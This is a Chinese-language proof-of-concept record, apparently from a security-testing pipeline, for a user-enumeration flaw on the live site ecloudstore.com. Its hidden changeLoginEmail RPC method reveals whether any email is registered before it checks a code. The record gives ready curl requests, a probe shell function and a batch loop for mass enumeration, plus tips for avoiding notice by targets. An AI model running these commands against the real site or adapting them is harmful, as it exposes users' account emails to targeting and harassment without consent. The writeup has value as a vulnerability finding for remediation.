# ecloudstore /api/command changeLoginEmail 先判邮箱注册状态再验码（登录后用户枚举 oracle）

- **code**: ecloudstore-changeloginemail-email-registered-oracle
- **kind**: poc
- **category**: info-leak
- **component**: ecloudstore 自研站（/api/command RPC 网关，changeLoginEmail / sendChangeEmailCode 方法）
- **severity**: low
- **language**: markdown
- **source**: self
- **verified**: 1
- **verified_note**: task#616 / finding 1296，2026-11-06 16:19~16:40(+08) 在 Windows 执行机用 python requests（trust_env=False / --noproxy 直连）对 https://ecloudstore.com 实测，持普通用户会话（yk_session cookie，账号为临时域名自建号，口令已脱敏）。判据对照成立：① 从未给目标邮箱发过码且 code 传空串，POST /api/command {"method":"changeLoginEmail","args":["yk…@fldubai.com","","<口令>"]} → HTTP 200 {"ok":false,"error":"该邮箱不可使用","data":null}（已注册）；② 同一请求换未注册邮箱 → HTTP 200 {"ok":false,"error":"请先获取验证码","data":null}（未注册）；③ admin@ecloudstore.com、support/service/info/contact/kefu/root/sales@ecloudstore.com 与随机 gmail 全部回「请先获取验证码」，即该站这些运营邮箱均未注册；④ 大小写、尾点、尾空格变体仍回「该邮箱不可使用」，说明服务端对输入做了归一化，oracle 不会被写法绕过。另 POST {"method":"sendChangeEmailCode","args":["<临时邮箱>"]} → 200 {"ok":true,"data":{"ttl":900,"interval":60}}，T+20s 收件箱真实收到「验证码为：24282」，证明站点发信链路可达（推翻此前「发信全废」的结论）。未做「非临时域名已注册账号」的阳性质控（fldubai.com 属临时邮箱黑名单），这一点已在正文标注为残留缺口。
- **path**: pocs/ecloudstore-changeloginemail-email-registered-oracle/poc.md
- **tags**: ecloudstore,api-command,changeLoginEmail,email-enumeration,user-enumeration,info-leak,oracle,csrf,rpc-gateway
- **created_at**: 2026-11-06T08:31:39.495Z
- **engine**: https://ecloudstore.com

## 描述

ecloudstore 的 /api/command RPC 网关里，隐藏方法 changeLoginEmail 在「是否给目标邮箱发过验证码」「验证码是否正确」之前就先查邮箱占用，并返回可区分的两档文案：已注册 → 「该邮箱不可使用」，未注册 → 「请先获取验证码」。因此只要有一个普通登录会话，就能零验证码、零发信地批量判定任意邮箱是否在本站注册（用户枚举）。服务端对输入做归一化（大小写/尾点/尾空格同判），无法用写法差异绕过判定。

## 用法

```
前置：任意已注册普通用户会话的 yk_session cookie + 从 GET /api/bootstrap 取到的 csrf（该接口本身无需登录）。
1) 取 csrf：curl -s --noproxy '*' https://ecloudstore.com/api/bootstrap | jq -r .csrf（同时可看 state.session.userId 确认登录态）。
2) 逐个邮箱发：
curl -s --noproxy '*' 'https://ecloudstore.com/api/command' -H 'Content-Type: application/json' -H 'Origin: https://ecloudstore.com' -H "X-CSRF-Token: $CSRF" -H "Idempotency-Key: $(uuidgen)" --data '{"method":"changeLoginEmail","args":["<候选邮箱>","","<当前账号口令>"]}'
3) 判据只有两档：error=「该邮箱不可使用」→ 该邮箱已注册；error=「请先获取验证码」→ 未注册。code 一栏必须传空串，且不要先去调 sendChangeEmailCode（否则会给目标邮箱发真实邮件，既打草惊蛇又污染判据）。
4) 每发换新 Idempotency-Key，间隔 ≥1s；批量时把候选列表写成文件循环，记录命中项。
5) 附带确认发信链路：POST {"method":"sendChangeEmailCode","args":["<你自己可控的邮箱>"]} 返回 {"ok":true,"data":{"ttl":900,"interval":60}} 且收件箱真收到码，说明后续可用注册/改邮箱闭环（注意该接口 = 真实发信，只对自己可控地址用）。
常见失败：没有 csrf 或 Origin 头 → 403/拦截；未登录会话 → 401/要求登录；自己先发过码 → 两档文案都变成「验证码错误」，oracle 失效，需换一个从未发过码的目标邮箱重测。
```

## 正文

```
# ecloudstore /api/command `changeLoginEmail` —— 验证码校验前的邮箱注册状态 oracle

## 结论

`POST /api/command` 的 `changeLoginEmail`（前端未暴露的隐藏方法）在下面两步**之前**就先做了邮箱占用检查：

1. 是否给该邮箱发过验证码；
2. 验证码是否正确。

于是同一个请求、`code` 传空串、且从未给目标邮箱发过码，服务端仍会点名该邮箱的注册状态，形成两档可区分文案：

| 目标邮箱状态 | 返回 |
|---|---|
| **已注册** | `HTTP 200 {"ok":false,"error":"该邮箱不可使用","data":null}` |
| **未注册** | `HTTP 200 {"ok":false,"error":"请先获取验证码","data":null}` |

⇒ 持任意一个普通用户会话即可零验证码、零发信地批量判定任意邮箱是否已在本站注册（用户枚举 oracle）。

服务端对输入做了归一化：大小写变体、尾部 `.`、尾部空格仍然落到「该邮箱不可使用」，所以 oracle 不受写法影响（也说明归一化在占用检查之前完成）。

## 前置条件

- 任意已注册的**普通用户**会话（Cookie `yk_session`），无需管理员。
- `GET /api/bootstrap` 取 `csrf`（该接口本身匿名可达；返回体里的 `state.session` 可用来确认是否已登录）。
- 请求头必须带 `Origin: https://ecloudstore.com` 与 `X-CSRF-Token: <csrf>`。
- **每一发都要新的 `Idempotency-Key`**（复用会被幂等去重）。

## 请求

```http
POST /api/command HTTP/1.1
Host: ecloudstore.com
Origin: https://ecloudstore.com
Content-Type: application/json
X-CSRF-Token: <csrf>
Idempotency-Key: <uuid4>

{"method":"changeLoginEmail","args":["<候选邮箱>","","<当前账号口令>"]}
```

curl 等价：

```bash
CSRF=$(curl -s --noproxy '*' https://ecloudstore.com/api/bootstrap | jq -r .csrf)

probe() {  # $1 = 候选邮箱
  curl -s --noproxy '*' 'https://ecloudstore.com/api/command' \
    -H 'Content-Type: application/json' \
    -H 'Origin: https://ecloudstore.com' \
    -H "X-CSRF-Token: $CSRF" \
    -H "Idempotency-Key: $(uuidgen)" \
    --data "{\"method\":\"changeLoginEmail\",\"args\":[\"$1\",\"\",\"<当前账号口令>\"]}"
  echo
}

probe 'someone@example.com'
```

`args` 顺序实测为 `[新邮箱, 验证码, 当前口令]`；第三位填当前登录账号的真实口令（错误口令会得到与邮箱状态无关的失败，别用它判读）。

## 判据

| 返回 error | 含义 |
|---|---|
| `该邮箱不可使用` | 该邮箱**已注册** |
| `请先获取验证码` | 该邮箱**未注册**（且本会话未发过码） |
| `验证码错误` 之类 | 该邮箱已发过码、本轮 oracle 失效，换一个未发过码的邮箱重测 |
| `401` / 要求登录 | 会话失效 |
| `403` | 缺 `Origin` / `X-CSRF-Token`，或 IP 被拦 |

## 附带发现：站点发信链路真实可达

```json
POST /api/command
{"method":"sendChangeEmailCode","args":["<自己可控的邮箱>"]}
→ 200 {"ok":true,"data":{"ttl":900,"interval":60}}
```

约 20 秒后收件箱真实收到该站发出的验证码邮件（发件人为站点配置的第三方邮件服务邮箱，正文形如「验证码为：NNNNN」）。

意义：可以走 `sendRegisterCode` + `register`（或 `sendChangeEmailCode` + `changeLoginEmail`）做**完整闭环**——包括用自己可控邮箱建号后再回测 oracle，补上「非临时域名已注册账号」的阳性质控。

注意：这个接口会**真的发信**，只对自控地址使用，别拿目标站邮箱当靶子（骚扰 + 污染判据）。

## 批量用法

把候选邮箱写进 `emails.txt`，循环调用上面的 `probe`，每发间隔 ≥1s（网关侧另有连接层限速倾向），按下表归类落表：

```
cat emails.txt | while read e; do printf '%s\t' "$e"; probe "$e" | jq -r '.error'; sleep 1; done
```

## 失败时的常见原因

1. **先调了 `sendChangeEmailCode`** → 该邮箱进入「已发码」状态，两档文案统一变成「验证码错误」，oracle 被自己打掉；重测时换没发过码的邮箱。
2. **`code` 不传空串**（传垃圾串或不传）→ 部分情况下先撞验证码校验，得到无关报错。
3. **没换 `Idempotency-Key`** → 请求被幂等去重，看起来像成功但实际没打到业务逻辑。
4. **缺 `Origin`** → 403，不进入业务层。
5. **用管理员会话测** → 若管理员侧对 changeLoginEmail 有额外分支，文案可能与普通用户不同；用普通用户会话最稳。
6. **把「该邮箱不可使用」读成「格式非法」** → 已用未注册邮箱对照排除了这一解释（格式合法但未注册回的是「请先获取验证码」）。

## 残留缺口

本轮阳性质控用的邮箱域名在临时邮箱黑名单内，未取得「非临时域名的已注册账号」样本。补闭环建议：

1. `sendRegisterCode` → 用自己的 googlemail/gmail 地址收码 → `register` 建号；
2. 对该新号再走一次 `changeLoginEmail`，期望得到「该邮箱不可使用」；
3. 同时确认一个同域但未注册的地址回「请先获取验证码」，双向夹逼即可彻底排除「域名被拉黑导致文案不同」的可能。

```
